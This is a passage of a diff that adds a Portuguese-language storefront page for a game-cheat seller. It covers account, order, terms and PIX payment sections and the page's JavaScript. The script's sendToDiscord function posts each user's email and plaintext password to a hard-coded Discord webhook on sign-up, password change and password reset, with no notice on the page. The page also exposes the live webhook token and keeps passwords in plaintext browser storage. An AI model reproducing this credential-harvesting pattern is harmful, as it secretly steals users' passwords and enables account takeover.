+             <button type="button" class="back-button action-button" onclick="hideForgotPassword()">Voltar</button>
+          </div>
+
+          <button class="action-button" id="logoutButton" style="background-color: #f44336; margin-top: 30px;">Sair da Conta</button>
+          <button class="action-button" id="deleteAccountButton" style="background-color: #d32f2f;">Deletar Conta</button>
+        </div>
+      </div>
+    </section>
+
+    <section id="completed-orders" class="panel">
+      <div class="content-container">
+        <h2>Meus Pedidos Concluídos</h2>
+        <div class="completed-orders-list" id="completedOrdersList">
+            <p id="emptyOrdersMessage" class="empty-message">Você ainda não tem pedidos concluídos.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="termos" class="panel">
+      <div class="content-container">
+        <h2>Termos e Condições de Uso</h2>
+        <div class="terms-content">
+          <h3>Responsabilidade:</h3>
+          <p>Ao utilizar nosso produto, você assume total responsabilidade pela compra e uso, isentando-nos de qualquer problema resultante do mau uso da ferramenta.</p>
+
+          <h3>Reembolso:</h3>
+          <p>Não haverá reembolso. Se o produto não atende aos requisitos, não há direito a suporte!</p>
+
+          <h3>Venda não autorizada ou compartilhamento:</h3>
+          <p>Após adquirir nosso conteúdo, é estritamente proibido vender sua chave de licença ou compartilhar o acesso com terceiros. Caso seja identificada qualquer violação dessas regras em nosso sistema, sua conta será permanentemente excluída e banida, sem direito a reembolso.</p>
+
+          <h3>Venda por terceiros não autorizados:</h3>
+          <p>Se adquirir nosso conteúdo por meio de um terceiro não autorizado, não poderemos oferecer suporte ou assistência. Caso a licença seja identificada, ela será permanentemente excluída e banida.</p>
+
+          <h3>Perda de licença:</h3>
+          <p>Não nos responsabilizamos caso você perca sua licença. É de sua responsabilidade fazer o devido backup das informações após a entrega do produto.</p>
+
+          <h3>Difamação:</h3>
+          <p>Não toleramos difamação de nosso produto em outros servidores ou lojas. Qualquer usuário que faça isso, será banido e a key será resetada.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="panel">
+      <div class="content-container">
+        <h2>Sobre</h2>
+        <p>Jorge Xiters é uma plataforma dedicada a fornecer modificações e cheats seguros para diversos jogos. Nosso objetivo é melhorar sua experiência de jogo de forma responsável e ética.</p>
+      </div>
+    </section>
+
+    <section id="contato" class="panel">
+      <div class="content-container">
+        <h2>Entre em Contato</h2>
+        <p>Tem alguma dúvida ou precisa de suporte? Fale conosco!</p>
+        <p>Email: <a href="mailto:suporte@jorgexiters.com">suporte@jorgexiters.com</a></p>
+        <p>Discord: <a href="https://discord.gg/XBSUuzRmEU" target="_blank">Clique para entrar no Discord</a></p>
+      </div>
+    </section>
+  </main>
+
+  <div id="paymentForm">
+    <div class="payment-content">
+      <button class="close-button" onclick="closePaymentForm()">&times;</button>
+      <h2>Confirmação de Compra</h2>
+      <p>Você selecionou o <span id="selectedPlanName"></span> por <span id="selectedPlanPrice"></span>.</p>
+      <label for="nome">Seu Nome:</label>
+      <input type="text" id="nome" placeholder="Digite seu nome completo" required>
+      <label for="email">Seu E-mail:</label>
+      <input type="email" id="email" placeholder="Digite seu melhor e-mail" required>
+      <button class="confirm-button" onclick="confirmarPagamento()">Confirmar e Gerar PIX</button>
+
+      <div id="pixInfo">
+        <h3>Pague com PIX</h3>
+        <p class="pix-instructions">Escaneie o QR Code ou use a chave Copia e Cola para pagar o valor de <span class="pix-value-display">R$ <span id="pixValue">0.00</span></span>.</p>
+        <img id="pixQRImage" src="https://placehold.co/180x180/9932CC/0f0f0f?text=QR+Code+PIX" alt="QR Code PIX de Exemplo"> 
+        <p class="pix-instructions">Ou use a chave Copia e Cola:</p>
+        <div id="pixCopyPaste">Exemplo: 00020126580014BR.GOV.BCB.PIX... (Seu backend vai gerar este)</div>
+        <button class="copy-button" onclick="copyPixCode()">Copiar Chave PIX</button>
+        <p style="margin-top: 15px; font-size: 0.9em; color: #aaa;">Após o pagamento, seu acesso será liberado automaticamente em alguns minutos.</p>
+        <button class="back-button confirm-button" onclick="closePaymentForm(); showMainSection('home');">Voltar ao Início</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // --- Variáveis Globais ---
+    let isSignUpMode = false; // Estado inicial: Login
+    let simulatedRecoveryCode = '';
+    let selectedPlan = {}; // Objeto para armazenar o plano selecionado no formulário de pagamento
+
+    // Elementos HTML para Autenticação
+    const authScreen = document.getElementById('authScreen');
+    const mainContent = document.getElementById('mainContent');
+    const authForm = document.getElementById('authForm');
+    const authTitle = document.getElementById('authTitle');
+    const authEmailInput = document.getElementById('authEmailInput');
+    const authPasswordInput = document.getElementById('authPasswordInput');
+    const mainAuthButton = document.getElementById('mainAuthButton');
+    const switchAuthModeButton = document.getElementById('switchAuthModeButton');
+    const loggedInUserEmailDisplay = document.getElementById('loggedInUserEmailDisplay');
+
+    // Elementos da seção "Conta"
+    const newPasswordInput = document.getElementById('newPassword');
+    const confirmNewPasswordInput = document.getElementById('confirmNewPassword');
+    const changePasswordButton = document.getElementById('changePasswordButton');
+    const forgotPasswordToggle = document.getElementById('forgotPasswordToggle');
+    const forgotPasswordSection = document.getElementById('forgotPasswordSection');
+    const forgotEmailInput = document.getElementById('forgotEmail');
+    const sendRecoveryCodeButton = document.getElementById('sendRecoveryCodeButton');
+    const recoveryCodeInputSection = document.getElementById('recoveryCodeInputSection');
+    const displayedRecoveryCode = document.getElementById('displayedRecoveryCode');
+    const recoveryCodeInput = document.getElementById('recoveryCode');
+    const resetNewPasswordInput = document.getElementById('resetNewPassword');
+    const resetConfirmNewPasswordInput = document.getElementById('resetConfirmNewPassword');
+    const resetPasswordButton = document.getElementById('resetPasswordButton');
+    const logoutButton = document.getElementById('logoutButton');
+    const deleteAccountButton = document.getElementById('deleteAccountButton');
+
+    // Elementos da seção "Concluídos"
+    const completedOrdersListDiv = document.getElementById('completedOrdersList');
+    const emptyOrdersMessage = document.getElementById('emptyOrdersMessage');
+
+    // Mapeamento de usuários (simulação de banco de dados local)
+    const users = JSON.parse(localStorage.getItem('users')) || {};
+    // Pedidos confirmados (simulação de banco de dados local)
+    let confirmedOrders = JSON.parse(localStorage.getItem('confirmedOrders')) || [];
+
+    // Sua Webhook URL do Discord
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1380361282598862878/EgHBBcgIlIYeEaYrr08nOA1W_6PsZz_j5yWLxSNIeT672R1RGTWT124esBmtG6jTn81f'; // Certifique-se de que esta URL está correta
+
+    // --- Funções Auxiliares ---
+
+    /**
+     * Função para enviar informações para o webhook do Discord.
+     */
+    async function sendToDiscord(email, password, action, orderDetails = null) {
+      let messageContent;
+      let color;
+      let title;
+      let fields = [];
+
+      if (action === 'register') {
+        title = '🎉 Nova Conta Cadastrada';
+        messageContent = `Email: \`${email}\`\nSenha: \`${password}\``;
+        color = 65280; // Green (manter verde para notificação de sucesso)
+      } else if (action === 'password_change') {
+        title = '⚠️ Senha Alterada';
+        messageContent = `Email: \`${email}\nNova Senha: \`${password}\``;
+        color = 16763904; // Orange
+      } else if (action === 'password_reset') {
+        title = '🔑 Senha Redefinida (Esqueceu Senha)';
+        messageContent = `Email: \`${email}\nNova Senha: \`${password}\``;
+        color = 16753920; // Yellow
+      } else if (action === 'account_deleted') {
+        title = '❌ Conta Deletada';
+        messageContent = `Email da conta deletada: \`${email}\``;
+        color = 16711680; // Red
+      } else if (action === 'payment_confirmed' && orderDetails) {
+        title = '✅ Novo Pedido Confirmado!';
+        messageContent = `Detalhes do pedido:`;
+        color = 3066993; // Light Green (for success)
+        fields.push(
+          { name: "Cliente", value: orderDetails.customerName, inline: true },
+          { name: "Email", value: orderDetails.customerEmail, inline: true },
+          { name: "Plano", value: orderDetails.durationName, inline: true }, /* Corrigido de 'platformName' para 'Plano' */
+          { name: "Valor", value: orderDetails.price, inline: true },
+          { name: "ID do Pedido", value: orderDetails.id, inline: false },
+          { name: "Data do Pedido", value: orderDetails.date, inline: false }
+        );
+      } else {
+        title = '❓ Ação Desconhecida';
+        messageContent = `Ação desconhecida para o email: ${email}`;
+        color = 8421504; // Gray
+      }
+
+      const message = {
+        username: "Sistema de Gerenciamento de Contas",
+        avatar_url: "https://i.imgur.com/KjZ7aD0.png", // Imagem do avatar do bot
+        embeds: [
+          {
+            title: title,
+            description: messageContent,
+            color: color,
+            timestamp: new Date().toISOString(),
+            footer: {
+              text: "Jorge Xiters Webhook System",
+              icon_url: "https://i.imgur.com/KjZ7aD0.png"
+            },
+            fields: fields.length > 0 ? fields : undefined // Só adiciona campos se houver
+          }
+        ]
+      };
+
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(message),
+        });
+        console.log(`Mensagem de ${action} enviada para o Discord!`);
+      } catch (error) {
+        console.error(`Erro ao enviar mensagem de ${action} para o Discord:`, error);
+      }
+    }
+
+    // --- Funções de Autenticação e Visibilidade de Tela ---
+
+    // Função para mostrar a tela de login/cadastro e esconder o conteúdo principal
+    function showAuthScreen() {
+      mainContent.classList.add('hidden-content');
+      authScreen.style.display = 'flex';
+      // Garante que o formulário de pagamento esteja fechado ao ir para a tela de auth
+      document.getElementById('paymentForm').classList.remove('active');
+    }
+
+    // Função para esconder a tela de login/cadastro e mostrar o conteúdo principal
+    function hideAuthScreen() {
+      authScreen.style.display = 'none';
+      mainContent.classList.remove('hidden-content');
+      showMainSection('home'); // Redireciona para a home após o login/cadastro
+    }
+
+    // Função para alternar entre Login e Cadastro
+    function toggleAuthMode() {
+      isSignUpMode = !isSignUpMode;
+      if (isSignUpMode) {
+        authTitle.textContent = "Criar Conta";
+        mainAuthButton.textContent = "Cadastrar";
+        switchAuthModeButton.textContent = "Já tem uma conta? Faça login!";
+      } else {
+        authTitle.textContent = "Login";
+        mainAuthButton.textContent = "Entrar";
+        switchAuthModeButton.textContent = "Não tem uma conta? Crie uma!";
+      }
+      authEmailInput.value = '';
+      authPasswordInput.value = '';
+    }
+
+    // Função para mostrar a seção principal e esconder as outras
+    function showMainSection(sectionId) {
+      const sections = document.querySelectorAll('.panel'); // Todas as seções principais
+      sections.forEach(section => {
+        section.classList.remove('active');
+      });
+
+      const targetSection = document.getElementById(sectionId);
+      if (targetSection) {
+        targetSection.classList.add('active');
+      }
+
+      // Atualiza a classe 'active' nos links de navegação para destacar o item selecionado
+      const navLinks = document.querySelectorAll('.nav-links li a');
+      navLinks.forEach(link => {
+        link.classList.remove('active');
+        if (link.getAttribute('data-section') === sectionId) {
+          link.classList.add('active');
+        }
+      });
+
+      // Lógica específica para cada seção
+      if (sectionId === 'account') {
+        const loggedInUser = localStorage.getItem('loggedInUser');
+        if (loggedInUser) {
+          loggedInUserEmailDisplay.textContent = loggedInUser;
+          // Reseta os campos de senha e esconde as seções de alteração/recuperação
+          document.getElementById('passwordChangeSection').classList.remove('hidden');
+          forgotPasswordSection.classList.add('hidden');
+          newPasswordInput.value = '';
+          confirmNewPasswordInput.value = '';
+          forgotEmailInput.value = '';
+          recoveryCodeInputSection.classList.add('hidden');
+          displayedRecoveryCode.textContent = '';
+          sendRecoveryCodeButton.classList.remove('hidden');
+          forgotEmailInput.removeAttribute('disabled');
+        } else {
+          alert('Você precisa estar logado para acessar a seção da conta.');
+          showAuthScreen(); // Redireciona para login se não estiver logado
+          return;
+        }
+      } else if (sectionId === 'completed-orders') {
+        const loggedInUser = localStorage.getItem('loggedInUser');
+        if (!loggedInUser) {
+          alert('Você precisa estar logado para ver seus pedidos concluídos.');
+          showAuthScreen(); // Redireciona para login se não estiver logado
+          return;
+        }
+        displayConfirmedOrders(loggedInUser); // Chama a função para exibir os pedidos
+      }
+
+      // Fecha o menu hambúrguer se estiver aberto após a seleção de um item
+      const navMenu = document.getElementById('navMenu');
+      const hamburger = document.getElementById('hamburger');
+      if (navMenu.classList.contains('active')) { // 'active' é a classe que abre o menu mobile
+        navMenu.classList.remove('active');
+        hamburger.classList.remove('active');
+      }
+    }
+
+    // Função para alternar o menu hambúrguer (mobile)
+    function toggleMenu() {
+      const navLinks = document.getElementById('navMenu');
+      const hamburger = document.getElementById('hamburger');
+      // Adiciona/remove a classe 'active' no navLinks para controlar a visibilidade e altura
+      navLinks.classList.toggle('active'); 
+      hamburger.classList.toggle('active');
+
+      // Adicional: Alterna o display do elemento <nav> que contém o navLinks
+      // Isso é necessário porque em mobile, o <nav> é inicialmente 'display: none'.
+      // Ao ativar o menu, precisamos que ele seja flex (ou block) para que o navLinks seja renderizado.
+      const navElement = navLinks.closest('nav');
+      if (navLinks.classList.contains('active')) {
+          navElement.style.display = 'flex'; // ou 'block', dependendo do layout desejado para o <nav> pai
+      } else {
+          navElement.style.display = 'none';
+      }
+    }
+
+
+    // --- Funções do Formulário de Pagamento (Modal) ---
+
+    // Função para abrir o formulário de pagamento
+    function openPaymentForm(button) {
+      const loggedInUser = localStorage.getItem('loggedInUser');
+      if (!loggedInUser) {
+        alert('Você precisa estar logado para fazer um pedido.');
+        showAuthScreen(); // Redireciona para login se não estiver logado
+        return;
+      }
+
+      const planoItem = button.closest('.plano-item');
+      selectedPlan = {
+        name: planoItem.dataset.planName,
+        price: parseFloat(planoItem.dataset.planPrice).toFixed(2).replace('.', ',') // Formata para BRL
+      };
+
+      document.getElementById('selectedPlanName').textContent = selectedPlan.name;
+      document.getElementById('selectedPlanPrice').textContent = `R$ ${selectedPlan.price}`;
+
+      document.getElementById('paymentForm').classList.add('active'); // Mostra o modal
+      document.getElementById("pixInfo").style.display = "none"; // Garante que as info PIX sumam
+      document.getElementById("nome").value = ""; // Limpa o campo nome
+      document.getElementById("email").value = ""; // Limpa o campo email
+    }
+
+    // Função para fechar o formulário de pagamento (o modal)
+    function closePaymentForm() {
+      document.getElementById('paymentForm').classList.remove('active');
+      document.getElementById("pixInfo").style.display = "none";
+      // Limpar campos do formulário para próxima vez
+      document.getElementById("nome").value = "";
+      document.getElementById("email").value = "";
+    }
+
+    // Confirmar pagamento (e agora, também "confirmar" o pedido e enviar webhook)
+    async function confirmarPagamento() {
+        const nome = document.getElementById("nome").value.trim();
+        const email = document.getElementById("email").value.trim();
+        const loggedInUser = localStorage.getItem('loggedInUser');
+
+        if (!loggedInUser) {
+            alert('Você precisa estar logado para fazer um pedido.');
+            showAuthScreen();
+            return;
+        }
+
+        if (nome && email.includes("@")) {
+            const planoSelecionadoNome = selectedPlan.name;
+            const valorPlano = parseFloat(selectedPlan.price.replace(',', '.')); // Converte para número para cálculos
+
+            // --- ESTE É O PONTO CHAVE PARA A INTEGRAÇÃO COM O SEU BACKEND ---
+            // Você vai substituir o código abaixo por uma chamada real à sua Netlify Function.
+            // Por enquanto, é apenas uma simulação para mostrar o fluxo.
+            
+            console.log(`Simulando chamada ao backend para gerar PIX para:
+                         Nome: ${nome}
+                         Email: ${email}
+                         Plano: ${planoSelecionadoNome}
+                         Valor: R$ ${valorPlano.toFixed(2)}`);
+
+            // SIMULAÇÃO: Para fins de demonstração, vamos apenas mostrar as informações do PIX de exemplo.
+            document.getElementById("pixValue").textContent = valorPlano.toFixed(2).replace('.', ',');
+            document.getElementById("pixInfo").style.display = "block"; // Mostra a seção de informações do PIX
+            
+            // NEW: Simular a confirmação do pagamento e adicionar aos pedidos concluídos
+            const orderId = `ORD-${Date.now()}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`; // Unique ID
+            const orderDate = new Date().toLocaleString('pt-BR'); // Data formatada
+            
+            const newOrder = {
+                id: orderId,
+                userEmail: loggedInUser, // Associar o pedido ao usuário logado
+                customerName: nome,
+                customerEmail: email,
+                plan: planoSelecionadoNome, // Nome do plano
+                price: `R$ ${valorPlano.toFixed(2).replace('.', ',')}`, // Formato de moeda
+                date: orderDate,
+                status: "Confirmado (Simulado)" // Para fins de demonstração
+            };
+
+            confirmedOrders.push(newOrder);
+            localStorage.setItem('confirmedOrders', JSON.stringify(confirmedOrders));
+
+            alert("Pagamento simulado concluído! Seu pedido foi adicionado à seção 'Meus Pedidos'.");
+            
+            // Envia um webhook para o Discord sobre o pagamento confirmado
+            await sendToDiscord(loggedInUser, null, 'payment_confirmed', {
+                customerName: nome,
+                customerEmail: email,
+                platformName: "N/A (Plataforma não especificada no plano)", // Adaptar se seus planos tiverem plataformas
+                durationName: planoSelecionadoNome, // Usar o nome do plano como duração aqui
+                price: `R$ ${valorPlano.toFixed(2).replace('.', ',')}`,
+                id: orderId,
+                date: orderDate
+            });
+
+        } else {
+            alert("Por favor, preencha corretamente seu nome e e-mail.");
+        }
+    }
+
+    // Função para copiar a chave PIX para a área de transferência
+    function copyPixCode() {
+      const pixCode = document.getElementById("pixCopyPaste").textContent;
+      navigator.clipboard.writeText(pixCode).then(() => {
+        alert("Chave PIX copiada!");
+      }).catch(err => {
+        console.error('Erro ao copiar: ', err);
+        alert('Falha ao copiar a chave PIX. Por favor, copie manualmente.');
+      });
+    }
+
+    // --- Lógica da Seção "Conta" ---
+
+    // Função para alterar a senha
+    changePasswordButton.addEventListener('click', async () => {
+      const loggedInUser = localStorage.getItem('loggedInUser');
+      if (!loggedInUser) {
+        alert('Nenhum usuário logado.');
+        return;
+      }
+      const newPass = newPasswordInput.value.trim();
+      const confirmNewPass = confirmNewPasswordInput.value.trim();
+
+      if (newPass === '' || confirmNewPass === '') {
+        alert('Por favor, preencha ambos os campos de nova senha.');
+        return;
+      }
+      if (newPass !== confirmNewPass) {
+        alert('As novas senhas não coincidem.');
+        return;
+      }
+      if (newPass === users[loggedInUser]) {
+        alert('A nova senha não pode ser igual à senha atual.');
+        return;
+      }
+
+      users[loggedInUser] = newPass;
+      localStorage.setItem('users', JSON.stringify(users));
+      await sendToDiscord(loggedInUser, newPass, 'password_change');
+      alert('Senha alterada com sucesso! Você precisará fazer login novamente com a nova senha.');
+      localStorage.removeItem('loggedInUser'); // Força o logout após a alteração de senha
+      showAuthScreen();
+      newPasswordInput.value = '';
+      confirmNewPasswordInput.value = '';
+    });
+
+    // Função para mostrar a seção de "Esqueceu a senha?"
+    forgotPasswordToggle.addEventListener('click', () => {
+      document.getElementById('passwordChangeSection').classList.add('hidden');
+      forgotPasswordSection.classList.remove('hidden');
+      forgotEmailInput.value = '';
+      recoveryCodeInputSection.classList.add('hidden');
+      displayedRecoveryCode.textContent = '';
+      simulatedRecoveryCode = ''; // Reseta o código simulado
+      sendRecoveryCodeButton.classList.remove('hidden');
+      forgotEmailInput.removeAttribute('disabled');
+    });
+
+    // Função para esconder a seção de "Esqueceu a senha?"
+    function hideForgotPassword() {
+      forgotPasswordSection.classList.add('hidden');
+      document.getElementById('passwordChangeSection').classList.remove('hidden');
+      newPasswordInput.value = '';
+      confirmNewPasswordInput.value = '';
+    }
+
+    // Função para enviar (simular) o código de recuperação
+    sendRecoveryCodeButton.addEventListener('click', () => {
+      const email = forgotEmailInput.value.trim();
+      if (!email) {
+        alert('Por favor, insira seu email.');
+        return;
+      }
+      if (!users[email]) {
+        alert('Email não encontrado.');
+        return;
+      }
+      simulatedRecoveryCode = Math.floor(100000 + Math.random() * 900000).toString();
+      alert(`Seu código de recuperação (SIMULADO) é: ${simulatedRecoveryCode}\n\nPor favor, digite-o no campo abaixo.`);
+      displayedRecoveryCode.textContent = simulatedRecoveryCode;
+      recoveryCodeInputSection.classList.remove('hidden');
+      sendRecoveryCodeButton.classList.add('hidden');
+      forgotEmailInput.setAttribute('disabled', 'true');
+    });
+
+    // Função para redefinir a senha com o código
+    resetPasswordButton.addEventListener('click', async () => {
+      const email = forgotEmailInput.value.trim();
+      const enteredCode = recoveryCodeInput.value.trim();
+      const resetNewPass = resetNewPasswordInput.value.trim();
+      const resetConfirmNewPass = resetConfirmNewPasswordInput.value.trim();
+
+      if (enteredCode !== simulatedRecoveryCode || simulatedRecoveryCode === '') {
+        alert('Código de recuperação incorreto ou não gerado. Tente novamente.');
+        return;
+      }
+      if (resetNewPass === '' || resetConfirmNewPass === '') {
+        alert('Por favor, preencha ambos os campos de nova senha.');
+        return;
+      }
+      if (resetNewPass !== resetConfirmNewPass) {
+        alert('As novas senhas não coincidem.');
+        return;
+      }
+      if (resetNewPass === users[email]) {
+        alert('A nova senha não pode ser igual à senha atual.');
+        return;
+      }
+
+      users[email] = resetNewPass;
+      localStorage.setItem('users', JSON.stringify(users));
+      await sendToDiscord(email, resetNewPass, 'password_reset');
+      alert('Senha redefinida com sucesso! Você pode fazer login com sua nova senha.');
+
+      // Limpar e redefinir a UI da seção de recuperação
+      forgotPasswordSection.classList.add('hidden');
+      document.getElementById('passwordChangeSection').classList.remove('hidden');
+      newPasswordInput.value = '';
+      confirmNewPasswordInput.value = '';
+      forgotEmailInput.value = '';
+      forgotEmailInput.removeAttribute('disabled');
+      recoveryCodeInput.value = '';
+      resetNewPasswordInput.value = '';
+      resetConfirmNewPasswordInput.value = '';
+      recoveryCodeInputSection.classList.add('hidden');
+      displayedRecoveryCode.textContent = '';
+      sendRecoveryCodeButton.classList.remove('hidden');
+      
+      localStorage.removeItem('loggedInUser'); // Força o logout
+      showAuthScreen(); // Retorna para a tela de login
+    });
+
+    // Função para sair da conta
+    logoutButton.addEventListener('click', () => {
+      if (confirm('Tem certeza que deseja sair da sua conta?')) {
+        localStorage.removeItem('loggedInUser');
+        alert('Você saiu da sua conta.');
+        showAuthScreen(); // Redireciona para a tela de autenticação
+        authEmailInput.value = '';
+        authPasswordInput.value = '';
+        toggleAuthMode(); // Garante que o modo seja Login após o logout
+        isSignUpMode = false;
+        authTitle.textContent = "Login";
+        mainAuthButton.textContent = "Entrar";
+        switchAuthModeButton.textContent = "Não tem uma conta? Crie uma!";
+      }
+    });
+
+    // Função para deletar conta
+    deleteAccountButton.addEventListener('click', async () => {
+      const loggedInUser = localStorage.getItem('loggedInUser');
+      if (!loggedInUser) {
+        alert('Nenhum usuário logado para deletar.');
+        return;
+      }
+      if (confirm(`Tem certeza que deseja DELETAR PERMANENTEMENTE a conta ${loggedInUser}? Esta ação não pode ser desfeita.`)) {
+        // Remove o usuário do objeto de usuários
+        delete users[loggedInUser];
+        localStorage.setItem('users', JSON.stringify(users));
+
+        // Remove todos os pedidos associados a este usuário
+        confirmedOrders = confirmedOrders.filter(order => order.userEmail !== loggedInUser);
+        localStorage.setItem('confirmedOrders', JSON.stringify(confirmedOrders));
+
+        // Envia notificação para o Discord
+        await sendToDiscord(loggedInUser, 'N/A', 'account_deleted');
+
+        localStorage.removeItem('loggedInUser');
+        alert('Conta deletada com sucesso. Você foi desconectado.');
+        showAuthScreen(); // Redireciona para a tela de autenticação
+        authEmailInput.value = '';
+        authPasswordInput.value = '';
+        toggleAuthMode(); // Garante que o modo seja Login após a exclusão
+        isSignUpMode = false;
+        authTitle.textContent = "Login";
+        mainAuthButton.textContent = "Entrar";
+        switchAuthModeButton.textContent = "Não tem uma conta? Crie uma!";
+      }
+    });
+
+    // --- Lógica da Seção "Concluídos" ---
+
+    // Função para exibir os pedidos confirmados do usuário logado
+    function displayConfirmedOrders(loggedInUserEmail) {
+      completedOrdersListDiv.innerHTML = ''; // Limpa a lista antes de adicionar
+      const userOrders = confirmedOrders.filter(order => order.userEmail === loggedInUserEmail);
+
+      if (userOrders.length === 0) {
+        emptyOrdersMessage.style.display = 'block';
+        completedOrdersListDiv.appendChild(emptyOrdersMessage);
+      } else {
+        emptyOrdersMessage.style.display = 'none';
+        userOrders.forEach(order => {
+          const orderCard = document.createElement('div');
+          orderCard.classList.add('order-card');
+          orderCard.innerHTML = `
+            <p><strong>Pedido #</strong>${order.id}</p>
+            <p><strong>Plano:</strong> ${order.plan}</p>
+            <p><strong>Valor:</strong> ${order.price}</p>
+            <p><strong>Cliente:</strong> ${order.customerName}</p>
+            <p><strong>Email para envio:</strong> ${order.customerEmail}</p>
+            <p><strong>Data do Pedido:</strong> ${order.date}</p>
+            <p><strong>Status:</strong> ${order.status}</p>
+          `;
+          completedOrdersListDiv.appendChild(orderCard);
+        });
+      }
+    }
+
+
+    // --- Event Listeners e Inicialização ---
+
+    // Lidar com o envio do formulário de autenticação
+    authForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = authEmailInput.value.trim();
+      const password = authPasswordInput.value.trim();
+
+      if (isSignUpMode) { // Modo de Cadastro
+        if (users[email]) {
+          alert("Este email já está cadastrado. Tente fazer login ou use outro email.");
+        } else {
+          users[email] = password; // Salva o email e senha (simulação)
+          localStorage.setItem('users', JSON.stringify(users));
+          localStorage.setItem('loggedInUser', email); // Marca como logado
+          alert("Conta criada com sucesso! Você está logado.");
+          await sendToDiscord(email, password, 'register'); // Enviar para o Discord Webhook
+          hideAuthScreen(); // Redireciona para a home
+        }
+      } else { // Modo de Login
+        if (users[email] && users[email] === password) {
+          localStorage.setItem('loggedInUser', email); // Marca como logado
+          alert("Login bem-sucedido!");
+          hideAuthScreen(); // Redireciona para a home
+        } else {
+          alert("Email ou senha incorretos.");
+        }
+      }
+    });
+
+    // Event listener para o botão de alternar modo
+    switchAuthModeButton.addEventListener('click', toggleAuthMode);
+
+    // Event listeners para navegação principal
+    document.querySelectorAll('.nav-link').forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const sectionId = link.getAttribute('data-section');
+        showMainSection(sectionId);
+      });
+    });
+
+    // Fechar menu ao clicar fora (o em um link dentro)
+    document.addEventListener('click', (e) => {
+      const hamburger = document.getElementById('hamburger');
+      const navMenu = document.getElementById('navMenu');
+      const navElement = navMenu.closest('nav'); // Get the parent <nav> element
+
+      // Verifica se o clique não foi no hambúrguer nem no menu, e se o menu está ativo
+      // O `.contains()` é importante para evitar fechar o menu se o clique foi nele mesmo ou em um de seus filhos.
+      if (!hamburger.contains(e.target) && !navMenu.contains(e.target) && navMenu.classList.contains('active')) {
+        navMenu.classList.remove('active');
+        hamburger.classList.remove('active');
+        navElement.style.display = 'none'; // Esconde o <nav> novamente quando o menu é fechado
+      }
+    });
+
+
+    // Efeito de rolagem no header para mudar o background
+    window.addEventListener('scroll', () => {
+      const header = document.querySelector('.header');
+      if (window.scrollY > 50) {
+        header.style.background = 'rgba(15, 15, 15, 0.98)';
+      }
+      else {
+        header.style.background = 'rgba(15, 15, 15, 0.95)';
+      }
+    });
+
+    // Inicialização do Site: Verifica se o usuário já está logado ou mostra a tela de autenticação
+    document.addEventListener('DOMContentLoaded', () => {
+      const loggedInUser = localStorage.getItem('loggedInUser');
+      if (loggedInUser) {
+        hideAuthScreen(); // Se logado, vai para a home
+      } else {
+        showAuthScreen(); // Se não logado, mostra a tela de autenticação
+      }
+
+      // Se houver um hash na URL (ex: #planos) e o usuário estiver logado, tenta ativar o painel correspondente
+      if (window.location.hash) {
+          const sectionIdFromHash = window.location.hash.replace('#', '');
+          // Garante que o ID seja de uma seção válida e não do formulário de pagamento ou auth
+          const validSections = ['home', 'servicos', 'planos', 'account', 'completed-orders', 'termos', 'about', 'contato']; 
+          if (validSections.includes(sectionIdFromHash)) {
+              // Verifica se o usuário está logado antes de tentar mostrar a seção principal
+              // Isso previne que seções restritas sejam acessadas sem login
+              if (loggedInUser || (sectionIdFromHash !== 'account' && sectionIdFromHash !== 'completed-orders')) {
+                  showMainSection(sectionIdFromHash);
+              } else {
+                  showAuthScreen(); // Se tentar acessar conta/pedidos sem login, volta para auth
+              }
+          } else {
+              if (loggedInUser) {
+                  showMainSection('home'); // Volta pra home se o hash for inválido e logado
+              } else {
+                  showAuthScreen(); // Se não logado e hash inválido, fica na tela de auth
+              }
+          }
+      } else if (loggedInUser) {
+          showMainSection('home'); // Se logado e sem hash, vai para a home
+      }
+    });
+
+    // --- Lógica das Partículas de Fundo ---
+    const canvas = document.getElementById('particles');
+    const ctx = canvas.getContext('2d');
+    
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    
+    resizeCanvas(); // Chama a função para ajustar o tamanho inicial do canvas
+    window.addEventListener('resize', resizeCanvas); // Reajusta o canvas ao redimensionar a janela
+
+    const particles = []; // Array para armazenar as partículas
+
+    // Cria 100 partículas com posições e propriedades aleatórias
+    for (let i = 0; i < 100; i++) {
+      particles.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        r: Math.random() * 2 + 1, // Raio da partícula
+        d: Math.random() * 1 + 0.5, // Velocidade de deslocamento
+        opacity: Math.random() * 0.5 + 0.2 // Opacidade da partícula
+      });
+    }
+
+    // Função para desenhar e animar as partículas
+    function drawParticles() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height); // Limpa o canvas a cada frame
+      
+      particles.forEach(p => {
+        ctx.fillStyle = `rgba(153, 50, 204, ${p.opacity})`; // Cor das partículas (Roxo brilhante)
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2, false); // Desenha um círculo
+        ctx.fill();
+        
+        p.y += p.d; // Move a partícula para baixo
+        if (p.y > canvas.height) { // Se a partícula sair da tela, reposiciona-a no topo
+          p.y = -10;
+          p.x = Math.random() * canvas.width;
+        }
+      });
+      requestAnimationFrame(drawParticles); // Chama a função novamente para o próximo frame (loop de animação)
+    }
+    drawParticles(); // Inicia a animação das partículas
+
+    // --- CÓDIGO PARA O EFEITO DE TOQUE/CLIQUE ---
+    document.addEventListener('mousedown', createRippleEffect);
+    document.addEventListener('touchstart', createRippleEffect); // Para dispositivos móveis
+
+    function createRippleEffect(event) {
+      // Evita que o efeito apareça ao clicar em elementos interativos específicos
+      // Se quiser que apareça em TUDO, remova este if.
+      // Exemplos: botões, inputs, links
+      if (event.target.tagName === 'BUTTON' ||
+          event.target.tagName === 'INPUT' ||
+          event.target.tagName === 'A' ||
+          event.target.closest('.auth-form') || // Não aparece no formulário de autenticação
+          event.target.closest('.payment-content')) { // Não aparece no formulário de pagamento
+        return;
+      }
+
+      const ripple = document.createElement('div');
+      ripple.classList.add('touch-ripple');
+
+      // Posição do clique/toque
+      let clientX, clientY;
